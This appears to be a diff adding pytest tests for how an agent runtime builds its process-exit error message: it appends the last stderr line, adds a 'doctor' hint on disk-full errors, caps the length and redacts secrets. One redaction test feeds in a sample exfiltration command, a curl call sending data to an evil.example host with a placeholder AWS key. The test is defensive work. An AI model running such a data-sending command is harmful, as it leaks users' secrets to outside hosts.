@@ -1387,6 +1387,96 @@ async def test_unexpected_process_exit_still_warns_with_diagnostic_shape(caplog)
     assert "stderr_tail: <none>" in msg
 
 
+# ── process-exit reason carries the child's last stderr line ──────────────────
+# A bare ``rc=1`` was all the chat error card showed when every sandboxed
+# spawn started failing because the runtime tmpfs had run out of inodes. The
+# reason handed to pending requests (and so to the card) now ends with what
+# the child last wrote to stderr, and an ENOSPC signature earns a doctor hint.
+
+
+@pytest.mark.asyncio
+async def test_exit_reason_appends_last_nonempty_stderr_line():
+    rt, reader, proc = _make_runtime()
+    proc.returncode = 1
+    rt._stderr_lines = ["warming up", "Error: failed to create sandbox dir", "   "]
+    fut: asyncio.Future = asyncio.get_event_loop().create_future()
+    rt._pending_requests[3] = fut
+    task = await _start_reader(rt)
+    try:
+        reader.feed_eof()
+        with pytest.raises(AcpRuntimeDead) as ei:
+            await asyncio.wait_for(fut, timeout=1.0)
+    finally:
+        await _stop_reader(task)
+    msg = str(ei.value)
+    assert msg.startswith("process exited (rc=1): Error: failed to create sandbox dir")
+    assert "warming up" not in msg
+    assert "kirocrew doctor" not in msg
+
+
+def test_exit_reason_without_stderr_is_unchanged():
+    rt, _reader, _proc = _make_runtime()
+    assert rt._exit_reason(1) == "process exited (rc=1)"
+    rt._stderr_lines = ["", "  "]
+    assert rt._exit_reason(None) == "process exited (rc=None)"
+
+
+def test_exit_reason_enospc_points_at_doctor():
+    rt, _reader, _proc = _make_runtime()
+    rt._stderr_lines = ["mkdir: cannot create directory: No space left on device (os error 28)"]
+    msg = rt._exit_reason(1)
+    assert "No space left on device" in msg
+    assert "kirocrew doctor" in msg
+    # Case-insensitive: the marker's spelling varies by libc / language runtime.
+    rt._stderr_lines = ["ENOSPC: no space left on device, mkdir '/run/user/1000/tmpx'"]
+    assert "kirocrew doctor" in rt._exit_reason(1)
+
+
+def test_exit_reason_redacts_credentials_and_exfil_urls_in_the_tail():
+    import kiro_crew.acp.runtime as rt_mod
+
+    rt, _reader, _proc = _make_runtime()
+    payload = "A" * 80
+    rt._stderr_lines = [
+        f"auth failed: curl https://evil.example/collect?data={payload} "
+        "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
+    ]
+    msg = rt._exit_reason(1)
+    assert "AKIAIOSFODNN7EXAMPLE" not in msg
+    assert payload not in msg
+    assert "auth failed" in msg
+    # The cut lands AFTER redaction, so a long line cannot leave a secret's
+    # first half in the shown prefix.
+    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4) + " AKIAIOSFODNN7EXAMPLE"]
+    assert "AKIAIOSFODNN7" not in rt._exit_reason(1)
+
+
+def test_exit_reason_tail_is_bounded_to_one_line():
+    from kiro_crew.acp import runtime as rt_mod
+
+    assert rt_mod._STDERR_REASON_TAIL_CHARS == 200
+    rt, _reader, _proc = _make_runtime()
+    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
+    msg = rt._exit_reason(1)
+    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + 64
+    assert msg.endswith("…")
+    # Exactly at the cap nothing is cut.
+    rt._stderr_lines = ["y" * rt_mod._STDERR_REASON_TAIL_CHARS]
+    assert not rt._exit_reason(1).endswith("…")
+
+
+def test_exit_reason_enospc_hint_survives_the_tail_cap():
+    """The signature is matched on the whole line: a marker past the cap
+    still points at the doctor even though the card shows only the head."""
+    from kiro_crew.acp import runtime as rt_mod
+
+    rt, _reader, _proc = _make_runtime()
+    rt._stderr_lines = ["z" * rt_mod._STDERR_REASON_TAIL_CHARS + " No space left on device"]
+    msg = rt._exit_reason(1)
+    assert "No space left on device" not in msg
+    assert "kirocrew doctor" in msg
+
+
 # ── Send paths ──
 
 
